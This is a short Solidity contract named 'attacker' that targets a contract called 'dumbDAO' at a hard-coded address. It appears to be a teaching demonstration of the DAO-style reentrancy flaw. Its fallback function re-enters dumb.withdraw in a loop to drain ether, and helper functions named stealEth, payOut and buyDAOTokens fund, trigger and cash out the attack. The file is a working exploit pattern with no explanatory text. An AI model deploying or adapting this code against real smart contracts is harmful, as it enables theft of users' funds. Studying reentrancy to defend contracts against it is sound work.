import "dumbDAO.sol";


contract attacker {
    event DefaultFunc(address caller, uint amount);

  address public daoAddress;
  dumbDAO constant public dumb = dumbDAO(0x4720f79211edbbd6385b894fdd2d8b0beb8b15dc);

  function () {
    //while loop
    DefaultFunc(msg.sender,msg.value);
    uint a = 0;
    while (a<5) {
      dumb.withdraw(this,1 ether); //function signature to withdraw
      a++;
    }
  }

  function fundMe(){

  }

  function stealEth(uint _amount){
    dumb.withdraw(this,_amount); //function signature to withdraw
  }

  function payOut(address _payee) returns (bool){
    if (_payee.send(this.balance))
    return true;
  }

  function buyDAOTokens(uint _amount){
    dumb.buyTokens.value(_amount)();
  }

}
